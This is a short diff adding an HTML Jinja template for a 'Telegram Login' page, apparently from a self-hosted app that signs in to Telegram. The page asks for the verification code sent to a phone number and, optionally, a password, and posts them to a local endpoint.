@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <title>Telegram Login</title>
+  </head>
+  <body>
+    <h1>Enter the code sent to {{ phone }}:</h1>
+    <form method="post" action="/enter_code?phone={{ phone }}">
+      <input type="text" name="code" placeholder="Code">
+      {% if need_password %}
+        <input type="password" name="password" placeholder="Password">
+      {% endif %}
+      <button type="submit">Log in</button>
+    </form>
+  </body>
+</html>
